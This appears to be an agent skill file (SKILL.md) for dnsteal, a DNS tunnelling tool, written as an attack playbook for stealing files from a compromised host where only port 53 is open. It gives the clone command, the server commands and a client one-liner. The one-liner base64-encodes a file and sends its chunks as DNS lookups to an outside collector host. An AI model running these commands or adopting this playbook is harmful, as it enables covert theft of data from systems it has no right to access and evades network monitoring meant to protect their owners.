---
name: dnsteal-dns-exfil
description: "dnsteal: exfiltrate files over DNS-only outbound. Signals: data exfiltration, data leakage, DNS file theft server, custom chunk length, sender."
zh-signals: "dnsteal: 纯 DNS 出网环境偷文件。信号:数据外传,数据泄露,DNS 文件窃取服务端,自定义分块长度,发送端。"
when-to-use: >-
  Use when only DNS port 53 is allowed outbound and you need to exfiltrate files from a
  compromised host by tunneling base64 chunks as subdomain queries.
---

# dnsteal

- Attack Category: C37 DNS Tunneling and Exploitation
- Upstream Repository: https://github.com/m57/dnsteal
- Upstream License: GPL-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/m57/dnsteal && cd dnsteal
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python dnsteal.py 10.0.0.5 -z` | DNS file theft server |
| `python dnsteal.py 10.0.0.5 -z -l 63 -f` | Custom chunk length |
| `client: for b in $(base64 -w 63 file); do host $b.dns.10.0.0.5.nip.io; done` | Sender |

## Attack Scenario Playbook

### Stealing files in a DNS-only egress environment

```bash
python dnsteal.py 10.0.0.5 -z
# The client sends base64 chunks as subdomains and the server reassembles the original file; works where only port 53 is allowed
```

## Notes

DNS exfiltration file tool with zero dependencies in pure Python. Chunk length must be ≤63 to fit the DNS label limit.
